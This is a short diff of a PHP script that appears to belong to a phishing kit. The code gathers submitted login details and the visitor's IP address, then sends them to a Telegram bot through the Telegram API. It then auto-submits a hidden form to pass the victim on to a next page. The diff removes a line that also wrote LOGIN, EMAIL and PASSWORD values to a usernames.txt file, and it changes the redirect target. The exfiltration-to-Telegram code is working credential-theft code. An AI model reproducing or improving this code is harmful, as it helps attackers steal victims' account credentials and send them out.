@@ -12,11 +12,6 @@ exit;
 }
 include 'telegram.php';
 
-//print info
-<?php 
-file_put_contents("usernames.txt", "LOGIN: " . $_POST['LOGIN'] . " EMAIL: " . $_POST['EMAIL'] . " PASSWORD: " . $_POST['PASSWORD'] ."\n", FILE_APPEND);
-?>
-
 //Get IP
 function getClientIP() {
 $ipaddress = '';
@@ -68,7 +63,7 @@ $details = "
 $ok = 
     file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($details));
 
-    echo "<form id='22' method='POST' action='congratulations.php'>
+    echo "<form id='22' method='POST' action='processing.php'>
     <input type='hidden' name='refresh'>
     </form>
     <script type='text/javascript'>document.getElementById('22').submit();</script>";
